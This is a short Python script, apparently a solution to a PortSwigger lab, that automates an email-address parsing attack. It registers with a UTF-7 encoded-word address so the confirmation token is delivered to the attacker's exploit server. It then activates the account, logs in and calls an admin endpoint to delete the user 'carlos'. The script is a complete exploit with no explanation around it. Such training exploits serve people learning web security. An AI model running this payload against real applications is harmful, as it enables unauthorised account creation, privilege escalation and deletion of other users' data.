import sys
import requests
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
register_url = burp_url + '/register'
delete_url = burp_url + '/admin/delete?username=carlos'

session = requests.Session()


response = session.get(burp_url)
exploit_server = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text).group(0)

email_server = exploit_server + '/email'
attacker_mail = 'attacker@' + exploit_server[8:]
EXPLOIT_SERVER_ID = exploit_server[8:]

response = session.get(register_url)
csrf = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text).group(1)

burp_data = {"csrf": csrf, "username": "test", "email": f"=?utf-7?q?attacker&AEA-{EXPLOIT_SERVER_ID}&ACA-?=@ginandjuice.shop", "password": "test"}
session.post(register_url, data=burp_data)

response = session.get(email_server)
register_token = re.search(r'temp-registration-token=[a-zA-Z0-9]{32}', response.text).group(0)

active_acc = register_url + '?' + register_token
session.get(active_acc)

response = session.get(login_url)
csrf = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text).group(1)
burp_data = {"csrf": csrf,"username": "test", "password": "test"}
session.post(login_url, data=burp_data)

session.get(delete_url)
